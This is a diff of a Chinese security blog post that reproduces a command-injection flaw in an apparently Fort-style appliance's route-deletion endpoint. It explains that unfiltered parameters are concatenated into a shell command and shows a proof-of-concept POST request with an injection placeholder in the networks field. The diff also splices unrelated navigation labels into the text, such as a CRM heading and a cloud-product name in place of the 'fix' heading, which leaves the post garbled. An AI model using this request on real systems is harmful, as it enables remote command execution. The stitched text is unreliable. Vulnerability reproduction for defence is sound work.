@@ -26,15 +26,15 @@ Windows安全工具
 
 两个参数**networks**与**netmasks**被直接拼接在**cmd**中，然后调用`ShellExecutor`类的`exe`方法进行执行，未任何过滤或校验，从而造成[命令执行](https://mrxn.net/tag/rce)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")（两个参数均存在[命令执行](https://mrxn.net/tag/rce "标签：命令执行")漏洞）。
 
-操作系统
+网络
 
 深入探索
 
-安全研究工具
-
 安全研究资源
 
-安全工具下载
+客户关系管理
+
+Web安全培训
 
 # 漏洞复现
 
@@ -44,7 +44,7 @@ Windows安全工具
 
 > 多个参数均存在命令注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，这里以ethnum为例
 >
-> 漏洞修复方案
+> 孚盟云漏洞
 
 ```
 POST /fort/system;help/netConfig/del_route HTTP/1.1
@@ -53,6 +53,14 @@ Content-Type: application/x-www-form-urlencoded
 
 ipv=4&flags=UG&gateways=1.1.1.1&networks=RCE_POC&netmasks=255.255.255.0
 ```
+
+深入探索
+
+安全研究资源
+
+在线工具箱
+
+客户关系管理
 
 访问[命令执行](https://mrxn.net/tag/rce "标签：命令执行")结果文件
 
